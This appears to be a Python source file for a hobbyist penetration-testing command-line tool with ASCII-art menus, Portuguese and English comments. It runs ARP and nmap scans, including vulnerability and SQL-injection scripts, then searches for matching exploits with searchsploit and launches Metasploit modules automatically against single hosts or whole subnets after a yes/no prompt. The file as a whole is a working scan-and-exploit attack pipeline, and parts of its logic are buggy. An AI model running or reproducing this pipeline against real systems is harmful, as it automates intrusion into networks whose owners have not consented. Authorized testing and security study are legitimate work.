import nmap
from pymetasploit3.msfrpc import MsfRpcClient
from scapy.all import ARP, Ether, srp
import subprocess


targetlistIP = [] 

def scan_network(targetlistIP):
    nm = nmap.PortScanner()
    
    # Se `target` for uma lista, converte para string
    if isinstance(targetlistIP, list):
        target = ",".join(targetlistIP)  # Converte a lista para uma string separada por vírgulas
    else:
        target = targetlistIP

    # Se for um range de rede, usa varredura ARP
    if "/24" in target or "*" in target:
        nm.scan(hosts=target, arguments='-sn')  # Apenas descoberta de hosts
        live_hosts = nm.all_hosts()
        print(f"[*] Scanning {targetlistIP} for open ports and vulnerabilities...")
        nm.scan(hosts=",".join(live_hosts), arguments='-sV --script vuln')  # Varredura nos hosts ativos
    else:
        print(f"[*] Scanning {target} for open ports and vulnerabilities...")
        nm.scan(hosts=target, arguments='-sV --script vuln')
    
    # Print the scan results
    for host in nm.all_hosts():
        print(f"Host: {host}")
        for proto in nm[host].all_protocols():
            print(f"Protocol: {proto}")
            lport = nm[host][proto].keys()
            for port in lport:
                print(f"Port: {port}\tState: {nm[host][proto][port]['state']}")
    
    return nm

 #def scan_network(targetlistIP):
  #  nm = nmap.PortScanner()
   # nm.scan(targetlistIP, arguments='-sV --script vuln')
    #return nm

def search_exploits(service, version):
    result = subprocess.run(['searchsploit', service, version], capture_output=True, text=True)
    return result.stdout

def execute_metasploit_exploit(exploit_module, targetlistIP, port):
    """Executa um exploit do Metasploit contra o alvo."""
    msf_command = f"""
    msfconsole -q -x "
    use {exploit_module};
    set RHOSTS {targetlistIP};
    set RPORT {port};
    exploit;
    exit"
    """
    print(f"[*] Executando Metasploit: {exploit_module} contra {targetlistIP[0]}:{port}")
    result = subprocess.run(['bash', '-c', msf_command], capture_output=True, text=True)
    print(f"[*] Resultado do Metasploit:\n{result.stdout}")
    if result.stderr:
        print(f"[!] Erros:\n{result.stderr}")

def aggressive_scan(targetlistIP):
    print(f"[*] Iniciando varredura agressiva em {targetlistIP}...")
    scan_result = scan_network(targetlistIP)
    
    for host in scan_result.all_hosts():
        print(f"[*] Analisando host: {host}")
        for proto in scan_result[host].all_protocols():
            ports = scan_result[host][proto].keys()
            for port in ports:
                service = scan_result[host][proto][port]['name']
                version = scan_result[host][proto][port]['version']
                print(f"[+] Serviço detectado: {service} {version}")
                
                # Busca por exploits
                exploits = search_exploits(service, version)
                if exploits and "No Results" not in exploits:
                    print(f"[!] Exploits encontrados:\n{exploits}")
                    if confirm_execution():
                        # Extrair o módulo Metasploit do searchsploit (exemplo simplificado)
                        exploit_module = extract_metasploit_module(exploits)
                        if exploit_module:
                            print(f"[*] Executando exploit para {service} {version}...")
                            execute_metasploit_exploit(exploit_module, host, port)
                        else:
                            print("[!] Nenhum módulo Metasploit identificado automaticamente.")
                    else:
                        print("[*] Exploit não executado.")
                else:
                    print("[*] Nenhum exploit encontrado.")

def confirm_execution():
    response = input("Deseja executar o exploit? (s/n): ").lower()
    return response == 's'

def extract_metasploit_module(exploits_output):
    """Extrai um módulo Metasploit da saída do searchsploit (simplificado)."""
    lines = exploits_output.splitlines()
    for line in lines:
        if "Metasploit" in line and "|" in line:
            # Exemplo: "Apache 2.4.49 - exploit/multi/http/cve_2021_41773"
            parts = line.split("|")
            if len(parts) > 1:
                module = parts[0].strip().lower().replace(" ", "/").replace("-", "_")
                if module.startswith("exploit/"):
                    return module
                return f"exploit/{module}"
    return None

def get_target_ips(targetlistIP):
    print(emptylist)
    print("Type the IP number or type 'back' to return - type 'run' to start the scan")
    while True:
        input_script = input("Target List:")

        if input_script == "run":
            print(f"Target List: {targetlistIP}")
            break
        if input_script == "back":
            break
        else:
            targetlistIP.append(input_script)
            print(f"IP number {input_script} added ")


#########################################################################3








# Function to perform an ARP scan
def arp_scan(target_ip):
    
    # Create an ARP request packet
    # The ARP request is sent to the broadcast MAC address (ff:ff:ff:ff:ff:ff)
    # and asks for the IP addresses in the target_ip range.
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), timeout=2, retry=1)
    # Iterate over the answered packets
    for snd, rcv in ans:
        # Print the IP and MAC address of each responding device
        print(f"IP: {rcv.psrc} MAC: {rcv.hwsrc}")

# 1 NMAP TCP,O.S. AND SERVICES SCANNING
def run_nmap_scan1(targetlistIP):
    for target in targetlistIP:
        # Nmap command
        command = ["nmap", "-sS", "-sV", "-O", target]

        try:
            # Execute the Nmap command
            result = subprocess.run(command, capture_output=True, text=True)

            # Check if the command was successful
            if result.returncode == 0:
                print(f"Nmap scan completed successfully for {target}:")
                print(result.stdout)
            else:
                print(f"Error running Nmap scan for {target}:")
                print(result.stderr)
        except Exception as e:
            print(f"An error occurred while running the scan for {target}: {e}")

# Nmap scan with the http-sql-injection and ftp-anon scripts.
def run_nmap_scripts1(targetlistIP):

    """
    Run an Nmap scan with the http-sql-injection and ftp-anon scripts.

    Args:
        target (str): The target IP address or range to scan.
    """
    print(f"Starting Nmap scan on {targetlistIP} with http-sql-injection and ftp-anon scripts...")
    
    # Create an Nmap PortScanner object
    nm = nmap.PortScanner()
    
    # Perform the scan with the specified scripts
    nm.scan(targetlistIP, arguments='--script=http-sql-injection,ftp-anon')
    
    # Print the results
    print(f"[+] Nmap scan results for {targetlistIP}:")
    for host in nm.all_hosts():
        print(f"Host: {host} ({nm[host].hostname()})")
        print(f"State: {nm[host].state()}")

#NMAP local network
def run_nmap_scrpts2(targetlistIP):
    # Initialize the Nmap PortScanner object
    nm = nmap.PortScanner()
    
    # Initial message
    print(f"[*] command=nmap -A -T4 {targetlistIP} ...")
    
    # Execute the nmap -A -T4 command on the specified network
    nm.scan(hosts=targetlistIP, arguments='-A -T4')
    
    # Check if any hosts were found
    if not nm.all_hosts():
        print("[!] No devices found on the network.")
        return
    
    # Iterate over each host found
    for host in nm.all_hosts():
        print("\n" + "="*50)
        print(f"Host: {host}")
        print(f"State: {nm[host].state()}")
        
        # Display MAC addresses, if available (common in local networks)
        if 'mac' in nm[host]['addresses']:
            print(f"MAC Address: {nm[host]['addresses']['mac']}")
        
        # Display OS detection results, if available
        if 'osmatch' in nm[host] and nm[host]['osmatch']:
            print("\nOS Detection:")
            for os in nm[host]['osmatch']:
                print(f"  Name: {os['name']}")
                print(f"  Accuracy: {os['accuracy']}%")
                if 'osclass' in os:
                    for osc in os['osclass']:
                        print(f"    Type: {osc['type']}")
                        print(f"    Vendor: {osc['vendor']}")
                        print(f"    OS Family: {osc['osfamily']}")
        
        # Iterate over the protocols found (tcp, udp, etc.)
        for proto in nm[host].all_protocols():
            print(f"\nProtocol: {proto.upper()}")
            # Get all ports for this protocol
            ports = sorted(nm[host][proto].keys())  # Sort ports for readability
            if not ports:
                print("  No ports found.")
                continue
            
            # Iterate over each port
            for port in ports:
                port_info = nm[host][proto][port]
                state = port_info['state']
                print(f"  Port: {port}/{proto}")
                print(f"    State: {state}")
                
                # Display service details if available
                if 'name' in port_info and port_info['name']:
                    print(f"    Service: {port_info['name']}")
                if 'product' in port_info and port_info['product']:
                    print(f"    Product: {port_info['product']}")
                if 'version' in port_info and port_info['version']:
                    print(f"    Version: {port_info['version']}")
                if 'extrainfo' in port_info and port_info['extrainfo']:
                    print(f"    Extra Info: {port_info['extrainfo']}")
                
                # Display script scan results if available (from -A)
                if 'script' in port_info:
                    print("    Script Results:")
                    for script_id, output in port_info['script'].items():
                        print(f"      {script_id}: {output.strip()}")

#NMAP and exploit




inicial_logo = (""" ++------------------------------------------------------------------------------++
                    ++------------------------------------------------------------------------------++
                    || ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗██╗██╗   ██╗███████╗       ||
                    ||██╔═══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██║██║   ██║██╔════╝       ||
                    ||██║   ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗██║██║   ██║█████╗         ||
                    ||██║   ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██║╚██╗ ██╔╝██╔══╝         ||
                    ||╚██████╔╝██║     ██║     ███████╗██║ ╚████║███████║██║ ╚████╔╝ ███████╗       ||
                    || ╚═════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝  ╚══════╝       ||
                    ||        ████████╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗              ||
                    ||        ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║████╗  ██║██╔════╝              ||
                    ||           ██║   ██║   ██║██║   ██║██║     ██║██╔██╗ ██║██║  ███╗             ||
                    ||           ██║   ██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║             ||
                    ||           ██║   ╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝             ||
                    ||           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝              ||
                    ++------------------------------------------------------------------------------++
                    ++------------------------------------------------------------------------------++
""")

# Initial menu
inicial_menu = ("""  
··································································································································································
:░░░░░░░░░░░░░░░░░░░░░░░░░█░░░░░░░█░░░░░░░░░░░░░█░░░░░░░█░░░░░░░█░█░█▀▀░█░░░█▀▀░█▀█░█▄█░█▀▀░░░░░░░░░█░░░░░░░█░░░░░░░░░░░░░█░░░░░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░:
:░░░░░░░░░░░░░░░░░░░▄▄▄░▄▀░░▄▄▄░▄▀░░▄▄▄░░░▄▄▄░▄▀░░▄▄▄░▄▀░░▄▄▄░░░█▄█░█▀▀░█░░░█░░░█░█░█░█░█▀▀░░░▄▄▄░▄▀░░▄▄▄░▄▀░░▄▄▄░░░▄▄▄░▄▀░░▄▄▄░▄▀░░▄▄▄░░░░░░░░░░░░░░░░░░░░░░░░░░:
:░░░░░░░░░░░░░░░░░░░░░░░▀░░░░░░░▀░░░░░░░░░░░░░▀░░░░░░░▀░░░░░░░░░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░░░░░░░▀░░░░░░░▀░░░░░░░░░░░░░▀░░░░░░░▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░:
:░░░░░░░░░░░░░░░░░░░▀█▀░█░█░█▀█░█▀▀░░░▀█▀░█░█░█▀▀░░░▀█▀░█▀▄░░░█▀█░█▀▄░░░█░█░█▀▄░▀█▀░▀█▀░█▀▀░░░█░█░█▀█░█░█░█▀▄░░░█▀█░█▀█░▀█▀░▀█▀░█▀█░█▀█░░░░                      :
:░░░░░░░░░░░░░░░░░░░░█░░░█░░█▀▀░█▀▀░░░░█░░█▀█░█▀▀░░░░█░░█░█░░░█░█░█▀▄░░░█▄█░█▀▄░░█░░░█░░█▀▀░░░░█░░█░█░█░█░█▀▄░░░█░█░█▀▀░░█░░░█░░█░█░█░█░░▀░                      :
:░░░░░░░░░░░░░░░░░░░░▀░░░▀░░▀░░░▀▀▀░░░░▀░░▀░▀░▀▀▀░░░▀▀▀░▀▀░░░░▀▀▀░▀░▀░░░▀░▀░▀░▀░▀▀▀░░▀░░▀▀▀░░░░▀░░▀▀▀░▀▀▀░▀░▀░░░▀▀▀░▀░░░░▀░░▀▀▀░▀▀▀░▀░▀░░▀░                      :
:░░░░░░░░░░░░░░░░░░░░░▀█░░░░░█▀▄░█▀▀░█▀▀░▀█▀░█▀█░█▀▀░░░▀█▀░█▀█░█▀▄░█▀▀░█▀▀░▀█▀░░░▄▀░░▀█▀░█▀█░█▀▄░█▀▀░█▀▀░▀█▀░▀█▀░█▀█░▀▄░                                         :
:░░░░░░░░░░░░░░░░░░░░░░█░░░░░█░█░█▀▀░█▀▀░░█░░█░█░█▀▀░░░░█░░█▀█░█▀▄░█░█░█▀▀░░█░░░░█░░░░█░░█▀█░█▀▄░█░█░█▀▀░░█░░░█░░█▀▀░░█░                                         :
:░░░░░░░░░░░░░░░░░░░░░▀▀▀░▀░░▀▀░░▀▀▀░▀░░░▀▀▀░▀░▀░▀▀▀░░░░▀░░▀░▀░▀░▀░▀▀▀░▀▀▀░░▀░░░░░▀░░░▀░░▀░▀░▀░▀░▀▀▀░▀▀▀░░▀░░▀▀▀░▀░░░▀░░                                         :
:░░░░░░░░░░░░░░░░░░░░░▀▀▄░░░░█▀▀░█▀▀░█▀█░█▀█░█▀█░░░░                                                                                                             :
:░░░░░░░░░░░░░░░░░░░░░▄▀░░░░░▀▀█░█░░░█▀█░█░█░█░█░░░░                                                                                                             :
:░░░░░░░░░░░░░░░░░░░░░▀▀▀░▀░░▀▀▀░▀▀▀░▀░▀░▀░▀░▀░▀░░░░                                                                                                             :
:░░░░░░░░░░░░░░░░░░░░░▀▀█░░░░█▀▀░█░█░█▀█░█░░░█▀█░▀█▀░▀█▀░█▀█░▀█▀░▀█▀░█▀█░█▀█                                                                                     :
:░░░░░░░░░░░░░░░░░░░░░░▀▄░░░░█▀▀░▄▀▄░█▀▀░█░░░█░█░░█░░░█░░█▀█░░█░░░█░░█░█░█░█                                                                                     :
:░░░░░░░░░░░░░░░░░░░░░▀▀░░▀░░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░▀▀▀░░▀░░▀░▀░░▀░░▀▀▀░▀▀▀░▀░▀                                                                                     :
:░░░░░░░░░░░░░░░░░░░░░█░█░░░░█▀▀░█░█░█▀█░█░█░░░█▀█░█▀█░▀█▀░▀█▀░█▀█░█▀█░█▀▀                                                                                       :
:░░░░░░░░░░░░░░░░░░░░░░▀█░░░░▀▀█░█▀█░█░█░█▄█░░░█░█░█▀▀░░█░░░█░░█░█░█░█░▀▀█                                                                                       :
:░░░░░░░░░░░░░░░░░░░░░░░▀░▀░░▀▀▀░▀░▀░▀▀▀░▀░▀░░░▀▀▀░▀░░░░▀░░▀▀▀░▀▀▀░▀░▀░▀▀▀                                                                                       :
··································································································································································

                                            """)

emptylist = ("""
+=====================================================+
|     \│/  ╔═╗╔╦╗╔═╗╔╦╗╦ ╦  ╦╔═╗  ╦  ╦╔═╗╔╦╗  \│/     |
|     ─ ─  ║╣ ║║║╠═╝ ║ ╚╦╝  ║╠═╝  ║  ║╚═╗ ║   ─ ─     |
|     /│\  ╚═╝╩ ╩╩   ╩  ╩   ╩╩    ╩═╝╩╚═╝ ╩   /│\     |
| ╔╦╗╦ ╦╔═╗╔═╗  ╔╦╗╦ ╦╔═╗  ╦╔═╗  ╔═╗╔╦╗╔╦╗╦═╗╔═╗╔═╗╔═╗|
|  ║ ╚╦╝╠═╝║╣    ║ ╠═╣║╣   ║╠═╝  ╠═╣ ║║ ║║╠╦╝║╣ ╚═╗╚═╗|
|  ╩  ╩ ╩  ╚═╝   ╩ ╩ ╩╚═╝  ╩╩    ╩ ╩═╩╝═╩╝╩╚═╚═╝╚═╝╚═╝|
|   ╔═╗╦═╗  ╔╗ ╔═╗╔═╗╦╔═  ╔╦╗╔═╗  ╦═╗╔═╗╔╦╗╦ ╦╦═╗╔╗╔  |
|   ║ ║╠╦╝  ╠╩╗╠═╣║  ╠╩╗   ║ ║ ║  ╠╦╝║╣  ║ ║ ║╠╦╝║║║  |
|   ╚═╝╩╚═  ╚═╝╩ ╩╚═╝╩ ╩   ╩ ╚═╝  ╩╚═╚═╝ ╩ ╚═╝╩╚═╝╚╝  |
+=====================================================+
""")






print(inicial_logo)
print(inicial_menu)
 # Initialize the IP list outside the loop
ini = 1  # Initialize `ini` to 1 to enter the loop
first = input("INPUT:").lower()
if first == "phone" or first == "phone mode": # When the program runs on the phone, the ASCII art got messed up.
    print("""-/-/-/ WELCOME -/-/-/
                1. DEFINE TARGET 
                2. SCANN
                3. EXPLOITATION
                4. SHOW OPTIONS""")
    first = input("INPUT:").lower()

while True:  


    if first == '1' or first == 'targetIP' or first == 'define target':
       addtarget = input("Target IP:").lower()
       while True:
        if addtarget == 'back':
         print(inicial_menu)
         first = input("INPUT:").lower()
         break
        #addtarget = input("Target IP:")    
        targetlistIP.append(addtarget)
        print(f"Target List: {targetlistIP}")
        first = "return" # print the main Input 
        break
        
       
        

    elif first == "2" or first == "scann":
        while True:
            scan_menu = ("""TYPE OPTION:
                1.ARP_SCAN
                2.NMAP_SCAN
                3.gobuster
               type "back" to return
              /-/-/-/-/-/-/-/""")
            print(scan_menu)
            input_scan = input("TYPE OPTION:")
            if input_scan == "back" or input_scan == "BACK" or input_scan == "Back":
                print(inicial_menu)
                first = input("INPUT: ")
                break  
            elif input_scan == "1" or input_scan == "1.ARP_SCAN" or input_scan == "ARP_SCAN":
                if len(targetlistIP) > 0:
                    arp_scan(targetlistIP[0])  # Perform ARP scan on the first IP in the list
                else:
                    print(emptylist)
                    input_ipscan = input("IP NUMBER: ").lower()
                    if input_ipscan == "back":
                        break  # Return to the scan menu
                    else:
                        targetlistIP.append(input_ipscan)
                        print(f"TARGE: {targetlistIP}")

            elif input_scan == "2" or input_scan == "2.NMAP_SCAN" or input_scan == "NMAP_SCAN":
                print("""NMAP OPTIONS 
                         .1 TCP,O.S. AND SERVICES SCANNING (BASIC)
                         .2 SCRIPTS
                         .3 TCP PORT SCANNING WITH VULNERABILITIES SEARCH
                         .4 TYPE "back" TO RETURN """)  # Add NMAP_SCAN logic here
                
                nmap_input=input("Choose Option:").lower()


                while True:
                    if nmap_input == "back":
                        break
                    if nmap_input == "1" or nmap_input == ".1" or nmap_input == "basic":
                       while True: 
                                if len(targetlistIP) > 0:
                                    run_nmap_scan1(targetlistIP)
                                    break
                                else:
                                    print(emptylist)
                                    input_IPnmap=input("Type the IP:").lower()
                                if len(input_IPnmap) == 0 or input_IPnmap == "back":
                                    break 
                                if len(input_IPnmap) > 0:
                                    targetlistIP.append(input_IPnmap)
                                #1  run_nmap_scan1(targetlistIP)
                 
                    if nmap_input == "2" or nmap_input == "script" or nmap_input == "SCRIPT":
                        print(""" 1.Vulnerability Detection:
                                        http-sql-injection: Attempts to identify SQL injection vulnerabilities in web applications.
                                        ftp-anon: Checks if the FTP service allows anonymous access.
                                   2.Local Network:
                                        NMAP local network     """
                        )
                        input_script=input("INPUT:").lower()
                        if input_script == "1" or input_script == "Vulnerability Detection":
                         while True:
                                                     
                                if input_script == "back":
                                    break

                                if len(targetlistIP) > 0:
                                    print("Running Nmap scripts for vulnerability detection...")
                                    if len(targetlistIP) >= 1:
                                        print(f"Multiple targets detected. Running on the target:{targetlistIP[0]} first")
                                        for c in targetlistIP:
                                          run_nmap_scripts1(c)  
                                          targetlistIP.remove(c)
                                          print ("Starting on the next target")
                                    else:
                                      
                                      run_nmap_scripts1(targetlistIP[0])
                                      break
                                else: 
                                   print(emptylist)
                                   print("- Type 'run' to start the scan")
                                   while True: 
                                    
                                    
                                    input_script=input("Target List:")

                                    if input_script == "run":
                                        print(f"Target List: {targetlistIP}")                                        
                                        break
                                    if input_script == "back":
                                        break
                                    else:
                                       targetlistIP.append(input_script)
                                       print(f"IP number {input_script} added ")
                                if  len(input_script) == 0 or input_script == "back" or input_script == "BACK":
                                    break

                                if len(input_script) > 0:                                   
                                    targetlistIP.append(input_script)
                                    print(f"IP number {input_script} added ")
                                    
                        if input_script == "2" or input_script == "Local network" or input_script == "Local":
                            while True:
                                       if len(targetlistIP) > 0:
                                           run_nmap_scrpts2(targetlistIP[0])


                                       elif len(targetlistIP) == 0:
                                              print(emptylist)
                                              input_script=input("INPUT:")
                                              if input_script == "BACK" or input_script == "BACK" or input_script == "Back":
                                                   break
                                   
                                              else:
                                                   targetlistIP.append(input_script)
                                                   print(f"IP number {input_script} added ")
                            
                                

               
                                 


                    


            elif input_scan == "3" or input_scan == "3.gobuster" or input_scan == "gobuster":
                print("gobuster selected.")  # Add gobuster logic here
            else:
                print("Invalid option. Try again.")
        # Return to the initial menu after exiting the scan menu
        first = input("INPUT:")
    

    elif first == "3" or first == "exploit":
        while True:
                print("""CHOOSE YOUR OPTION
                        1. ANALYSE AND EXPLOIT """)
                
                input_exploit=input("TYPE OPTION:")

                if input_exploit == "back":
                    print(inicial_menu)
                    first = input("INPUT: ")
                    break
                
                if input_exploit == "1":
                  while True:
                    targetlistIP=[]
                    print("""That command will analyse and, in case of find a vulnerabilitie, exploit the target
                    You can choose 3 different options:
                    Usage example:
                                    set all devices in a subnet: #.#.#.0/24 
                                    set on multiple devices: #.#.#.*
                                    set on a single device: #.#.#.#
                                    Set up your target IP according with your desired option""")
                    input_exploit=input("TYPE OPTION:")  
                    targetlistIP.append(input_exploit)
                    if len(targetlistIP) > 0:
                     aggressive_scan(targetlistIP)

    
    
    
    #else:
     #   print("Invalid option. Try again.")
        
      #3
      #   first = input("INPUT:")


  
